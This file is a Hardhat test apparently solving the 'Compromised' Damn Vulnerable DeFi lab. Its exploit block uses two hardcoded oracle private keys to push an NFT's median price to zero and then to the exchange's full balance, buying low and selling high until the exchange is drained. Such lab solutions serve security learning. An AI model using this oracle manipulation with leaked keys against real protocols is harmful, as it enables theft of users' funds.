const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Compromised challenge', function () {

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    let deployer, attacker;
    const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('9990');
    const INITIAL_NFT_PRICE = ethers.utils.parseEther('999');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const ExchangeFactory = await ethers.getContractFactory('Exchange', deployer);
        const DamnValuableNFTFactory = await ethers.getContractFactory('DamnValuableNFT', deployer);
        const TrustfulOracleFactory = await ethers.getContractFactory('TrustfulOracle', deployer);
        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);

        // Initialize balance of the trusted source addresses
        for (let i = 0; i < sources.length; i++) {
            await ethers.provider.send("hardhat_setBalance", [
                sources[i],
                "0x1bc16d674ec80000", // 2 ETH
            ]);
            expect(
                await ethers.provider.getBalance(sources[i])
            ).to.equal(ethers.utils.parseEther('2'));
        }

        // Attacker starts with 0.1 ETH in balance
        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));

        // Deploy the oracle and setup the trusted sources with initial prices
        this.oracle = await TrustfulOracleFactory.attach(
            await (await TrustfulOracleInitializerFactory.deploy(
                sources,
                ["DVNFT", "DVNFT", "DVNFT"],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
            )).oracle()
        );

        // Deploy the exchange and get the associated ERC721 token
        this.exchange = await ExchangeFactory.deploy(
            this.oracle.address,
            { value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
    });

    it('Exploit', async function () {
        /** EXPLOIT
            The challenge begins by decoding the given information from the web server. Turns out its the private keys for two of the trusted oracle accounts !
            Using these, its possible to set the median price of the NFTs (since the median is calculated from the middle value in a sorted array) to any value we want.
            Hence, an attacker can buy one NFT for zero and sell it at the price of the exchange total balance to empty it.
        */
        
        const compromised_signers = [
            new ethers.Wallet("0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9", ethers.provider), // Private key of 0xe92401A4d3af5E446d93D11EEc806b1462b39D15
            new ethers.Wallet("0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48", ethers.provider) // Private key of 0x81A5D6E50C214044bE44cA0CB057fe119097850c
        ]; // Extracted from 'decode_server_data.py' script

        this.exchangeAttackerInstance = await this.exchange.connect(attacker);

        for (const signer of compromised_signers) {
            await (await this.oracle.connect(signer)).postPrice("DVNFT", 0); // Sets NFT prices to zero
        }

        expect(
            await this.oracle.getMedianPrice("DVNFT")
        ).to.equal('0');

        const buyTx = await (await this.exchangeAttackerInstance.buyOne({value: 1})).wait() // Buy one NFT, need to send some Wei that will be refunded by the exchange
        const buyEvent = buyTx.events.find(event => event.event === 'TokenBought');
        const [buyer, tokenId, price] = buyEvent.args;   
        console.log(buyer, "bought token #" + tokenId.toString() + " for " + price.toString() + " Wei !");

        for (const signer of compromised_signers) {
            await (await this.oracle.connect(signer)).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE); // Sets NFT prices to balance of exchange contract
        }

        await (await this.nftToken.connect(attacker)).approve(this.exchange.address, tokenId); // Approve NFT transfer from exchange
        await this.exchangeAttackerInstance.sellOne(tokenId); // Sell it full price !

        for (const signer of compromised_signers) {
            await (await this.oracle.connect(signer)).postPrice("DVNFT", INITIAL_NFT_PRICE); // Sets NFT prices back to original to pass tests
        }
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        
        // Exchange must have lost all ETH
        expect(
            await ethers.provider.getBalance(this.exchange.address)
        ).to.be.eq('0');
        
        // Attacker's ETH balance must have significantly increased
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
        
        // Attacker must not own any NFT
        expect(
            await this.nftToken.balanceOf(attacker.address)
        ).to.be.eq('0');

        // NFT price shouldn't have changed
        expect(
            await this.oracle.getMedianPrice("DVNFT")
        ).to.eq(INITIAL_NFT_PRICE);
    });
});
